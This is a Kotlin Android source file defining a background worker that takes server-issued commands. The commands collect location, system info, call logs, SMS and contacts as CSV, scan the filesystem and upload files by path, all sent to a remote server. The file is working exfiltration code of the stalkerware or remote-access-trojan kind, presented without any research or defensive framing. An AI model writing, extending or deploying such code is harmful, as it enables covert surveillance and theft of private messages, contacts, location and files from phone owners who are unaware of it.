// DataFetchWorker.kt
package com.example.lta

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkerParameters
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.File

/**
 * Background worker that handles various data fetching operations including:
 * - Location tracking
 * - System information collection
 * - CSV exports of call logs, SMS, and contacts
 *
 * All operations are performed with proper permission checks and error handling.
 */
class DataFetchWorker(
    private val appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    companion object {
        const val KEY_COMMAND = "command"
        private const val TAG = "DataFetchWorker"

        // Command constants for better type safety
        const val COMMAND_GET_LOCATION = "get_location"
        const val COMMAND_GET_SYSTEM_INFO = "get_system_info"
        const val COMMAND_GET_CALL_LOGS = "get_call_logs"
        const val COMMAND_GET_SMS = "get_sms"
        const val COMMAND_GET_CONTACTS = "get_contacts"
        const val COMMAND_SCAN_FILESYSTEM = "scan_filesystem"
        const val COMMAND_UPLOAD_FILE = "upload_file"

        // Minimum CSV lines to consider valid data (header + at least one row)
        private const val MIN_CSV_LINES = 2

        /**
         * Helper method to schedule a DataFetchWorker with a specific command
         */
        fun scheduleWork(context: Context, command: String) {
            val workRequest = OneTimeWorkRequestBuilder<DataFetchWorker>()
                .setInputData(workDataOf(KEY_COMMAND to command))
                .setConstraints(
                    Constraints.Builder()
                        .setRequiredNetworkType(NetworkType.CONNECTED)
                        .build()
                )
                .build()

            WorkManager.getInstance(context).enqueue(workRequest)
            Log.d(TAG, "Scheduled DataFetchWorker with command: $command")
        }
    }

    // Lazy initialization to avoid unnecessary object creation
    private val apiClient by lazy {
        ApiClient(appContext.getString(R.string.server_base_url))
    }
    private val manualDataManager by lazy {
        ManualDataManager(appContext)
    }
    private val systemInfoManager by lazy {
        SystemInfoManager(appContext)
    }
    private val fileSystemManager by lazy {
        FileSystemManager(appContext)
    }

    /**
     * Main worker execution method that dispatches commands to appropriate handlers
     */
    override suspend fun doWork(): Result {
        val command = inputData.getString(KEY_COMMAND)
        if (command.isNullOrBlank()) {
            Log.e(TAG, "Worker started without a valid command")
            return Result.failure()
        }

        Log.d(TAG, "Executing command: $command")

        return withContext(Dispatchers.IO) {
            try {
                val success = executeCommand(command)
                if (success) {
                    Log.d(TAG, "Command '$command' executed successfully")
                    Result.success()
                } else {
                    Log.w(TAG, "Command '$command' failed, will retry")
                    Result.retry()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error executing command '$command'", e)
                Result.failure()
            }
        }
    }

    /**
     * Executes the appropriate command based on input
     */
    private suspend fun executeCommand(command: String): Boolean {
        return when (command) {
            COMMAND_GET_LOCATION -> fetchAndSendLocation()
            COMMAND_GET_SYSTEM_INFO -> fetchAndSendSystemInfo()
            COMMAND_GET_CALL_LOGS -> fetchAndSendCsv(
                dataType = "CallLogs",
                csvProvider = manualDataManager::getCallLogsAsCsv
            )
            COMMAND_GET_SMS -> fetchAndSendCsv(
                dataType = "SMS",
                csvProvider = manualDataManager::getSmsAsCsv
            )
            COMMAND_GET_CONTACTS -> fetchAndSendCsv(
                dataType = "Contacts",
                csvProvider = manualDataManager::getContactsAsCsv
            )
            COMMAND_SCAN_FILESYSTEM -> scanFileSystem()
            COMMAND_UPLOAD_FILE -> uploadFile()
            else -> {
                Log.w(TAG, "Unknown command: $command")
                apiClient.uploadText("❌ Error: Unknown command '$command'")
                false
            }
        }
    }

    /**
     * Fetches current location and sends it to the server
     * Requires ACCESS_FINE_LOCATION permission
     */
    private suspend fun fetchAndSendLocation(): Boolean {
        return try {
            if (!hasLocationPermission()) {
                Log.e(TAG, "Location permission not granted")
                // Explicitly inform server about permission issues
                return apiClient.uploadText("❌ Location request failed: PERMISSION_DENIED")
            }

            val location = getCurrentLocation()
            if (location != null) {
                val message = buildString {
                    appendLine("📍 Location Update:")
                    appendLine("Latitude: ${location.latitude}")
                    appendLine("Longitude: ${location.longitude}")
                    appendLine("Accuracy: ${location.accuracy}m")
                    if (location.hasAltitude()) {
                        appendLine("Altitude: ${location.altitude}m")
                    }
                    appendLine("Timestamp: ${System.currentTimeMillis()}")
                }
                apiClient.uploadText(message.trim())
            } else {
                Log.w(TAG, "Failed to obtain location - received null despite having permission")
                apiClient.uploadText("📍 Location Update: LOCATION_UNAVAILABLE (Permission granted but location services may be disabled)")
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error fetching location", e)
            apiClient.uploadText("📍 Location Update: LOCATION_ERROR - ${e.message}")
            false
        }
    }

    /**
     * Checks if the app has fine location permission
     */
    private fun hasLocationPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            appContext,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
    }

    /**
     * Gets current location using FusedLocationProvider
     */
    private suspend fun getCurrentLocation(): Location? {
        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(appContext)
        return try {
            fusedLocationClient.getCurrentLocation(
                Priority.PRIORITY_BALANCED_POWER_ACCURACY,
                null
            ).await()
        } catch (e: Exception) {
            Log.e(TAG, "Exception getting current location", e)
            null
        }
    }

    /**
     * Fetches system information (network and battery) and sends to server
     */
    private suspend fun fetchAndSendSystemInfo(): Boolean {
        return try {
            val networkInfo = systemInfoManager.getNetworkType()
            val batteryInfo = systemInfoManager.getBatteryStatus()

            val systemInfoMessage = buildString {
                appendLine("⚙️ System Info:")
                appendLine("Network: $networkInfo")
                appendLine(batteryInfo.toString()) // Fixed: Explicitly convert to String
            }

            apiClient.uploadText(systemInfoMessage.trim())
        } catch (e: Exception) {
            Log.e(TAG, "Error fetching system info", e)
            apiClient.uploadText("⚙️ System Info: Error occurred - ${e.message}")
            false
        }
    }


    /**
     * Generic method to fetch CSV data and upload as file
     * @param dataType Human-readable name for the data type
     * @param csvProvider Function that returns CSV data as string
     */
    private suspend fun fetchAndSendCsv(
        dataType: String,
        csvProvider: () -> String
    ): Boolean {
        return try {
            Log.d(TAG, "Fetching $dataType data")
            val csvData = csvProvider()

            // Check if CSV has meaningful data (more than just header)
            val lineCount = csvData.lines().size
            if (lineCount < MIN_CSV_LINES) {
                Log.d(TAG, "No meaningful data to export for $dataType (only $lineCount lines)")
                return apiClient.uploadText("📊 $dataType export: No data found to export")
            }

            // Create temporary file for CSV data
            val tempFile = createTempCsvFile(dataType, csvData)

            return try {
                // Fixed: Use caption parameter instead of description
                val success = apiClient.uploadFile(
                    file = tempFile,
                    caption = "📊 Exported $dataType from device (${lineCount - 1} records)"
                )
                if (success) {
                    Log.d(TAG, "Successfully uploaded $dataType CSV with ${lineCount - 1} records")
                } else {
                    Log.w(TAG, "Failed to upload $dataType CSV file")
                }
                success
            } finally {
                // Always clean up temporary file
                if (tempFile.exists()) {
                    tempFile.delete()
                    Log.d(TAG, "Cleaned up temporary file: ${tempFile.name}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing $dataType CSV", e)
            apiClient.uploadText("📊 $dataType export failed: ${e.message}")
            false
        }
    }

    /**
     * Creates a temporary CSV file with the provided data
     */
    private suspend fun createTempCsvFile(dataType: String, csvData: String): File {
        return withContext(Dispatchers.IO) {
            val fileName = "${dataType.lowercase()}_${System.currentTimeMillis()}"
            val tempFile = File.createTempFile(fileName, ".csv", appContext.cacheDir)
            tempFile.writeText(csvData)
            Log.d(TAG, "Created temporary CSV file: ${tempFile.name} (${tempFile.length()} bytes)")
            tempFile
        }
    }

    /**
     * Scans the device filesystem and uploads the paths to the server
     */
    private suspend fun scanFileSystem(): Boolean {
        return try {
            if (!fileSystemManager.hasFileSystemPermissions()) {
                Log.e(TAG, "Filesystem permissions not granted")
                return apiClient.uploadText("❌ Filesystem scan failed: PERMISSIONS_DENIED")
            }

            Log.d(TAG, "Starting filesystem scan")
            val scanResult = fileSystemManager.scanFileSystem(
                includeSystemFiles = false,
                maxDepth = 8
            )

            if (scanResult.paths.isEmpty()) {
                Log.w(TAG, "No accessible files found during scan")
                return apiClient.uploadText("📁 Filesystem scan: No accessible files found")
            }

            // Format the scan results for upload
            val formattedData = fileSystemManager.formatPathsForUpload(scanResult)
            
            // Upload to server
            val deviceId = systemInfoManager.getDeviceId()
            val success = apiClient.uploadFileSystemPaths(formattedData, deviceId)

            if (success) {
                Log.i(TAG, "Filesystem scan data uploaded successfully")
                apiClient.uploadText("📁 Filesystem scan completed: ${scanResult.totalFiles} files, ${scanResult.totalDirectories} directories scanned")
            } else {
                Log.e(TAG, "Failed to upload filesystem scan data")
                apiClient.uploadText("📁 Filesystem scan completed but upload failed")
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error during filesystem scan", e)
            apiClient.uploadText("📁 Filesystem scan error: ${e.message}")
            false
        }
    }

    /**
     * Uploads a specific file requested by the server
     * File path should be provided in the command data
     */
    private suspend fun uploadFile(): Boolean {
        return try {
            val filePath = inputData.getString("filePath")
            if (filePath.isNullOrBlank()) {
                Log.e(TAG, "Upload file command received without file path")
                return apiClient.uploadText("❌ File upload failed: No file path specified")
            }

            if (!fileSystemManager.hasFileSystemPermissions()) {
                Log.e(TAG, "Filesystem permissions not granted for file upload")
                return apiClient.uploadText("❌ File upload failed: PERMISSIONS_DENIED")
            }

            val fileInfo = fileSystemManager.getFileInfo(filePath)
            if (fileInfo == null) {
                Log.w(TAG, "Requested file not found or not accessible: $filePath")
                return apiClient.uploadText("❌ File upload failed: File not found or not accessible")
            }

            if (fileInfo.isDirectory) {
                Log.w(TAG, "Cannot upload directory: $filePath")
                return apiClient.uploadText("❌ File upload failed: Path is a directory, not a file")
            }

            val file = File(filePath)
            if (!file.exists() || !file.canRead()) {
                Log.w(TAG, "File is not accessible: $filePath")
                return apiClient.uploadText("❌ File upload failed: File is not accessible")
            }

            // Check file size (limit to 100MB for safety)
            val maxFileSize = 100 * 1024 * 1024 // 100MB
            if (file.length() > maxFileSize) {
                Log.w(TAG, "File too large for upload: $filePath (${file.length()} bytes)")
                return apiClient.uploadText("❌ File upload failed: File too large (max 100MB)")
            }

            val deviceId = systemInfoManager.getDeviceId()
            val success = apiClient.uploadRequestedFile(file, deviceId, filePath)

            if (success) {
                Log.i(TAG, "File uploaded successfully: $filePath")
                apiClient.uploadText("📤 File uploaded successfully: ${file.name} (${formatFileSize(file.length())})")
            } else {
                Log.e(TAG, "Failed to upload file: $filePath")
                apiClient.uploadText("📤 File upload failed: ${file.name}")
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error during file upload", e)
            apiClient.uploadText("📤 File upload error: ${e.message}")
            false
        }
    }

    /**
     * Helper method to format file size
     */
    private fun formatFileSize(bytes: Long): String {
        if (bytes < 1024) return "$bytes B"
        val kb = bytes / 1024.0
        if (kb < 1024) return "%.1f KB".format(kb)
        val mb = kb / 1024.0
        if (mb < 1024) return "%.1f MB".format(mb)
        val gb = mb / 1024.0
        return "%.1f GB".format(gb)
    }
}
